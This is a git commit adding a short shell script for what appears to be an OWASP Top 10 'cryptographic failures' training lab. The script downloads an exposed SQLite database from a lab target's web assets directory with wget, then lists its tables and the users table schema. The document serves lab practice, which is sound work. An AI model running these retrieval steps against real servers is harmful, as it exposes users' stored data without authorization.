f55e9341703f63128b542e4855b5d5f5e92ca323
Nadege Lemperiere <nadege.lemperiere@gmail.com>
2024-11-30 19:44:58 -0500

    Testing script

---
+++ rooms/owasptop102021/cryptographic-failures.sh
@@ -0,0 +1,20 @@
+#/bin/sh
+
+# Retrieve absolute path to this script
+script=$(readlink -f $0)
+scriptpath=`dirname $script`
+
+# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
+target_ip="10.10.210.85"
+attack_ip="10.10.30.237"
+
+# Prepare environment
+mkdir /work/
+
+# Collect database content from assets directory (look at the page source code)
+wget http://$target_ip:81/assets/webapp.db
+
+# Use sqlite3 to gather content
+# Perform the query
+sqlite3 webapp.db ".tables"
+sqlite3 webapp.db "PRAGMA table_info(users)"
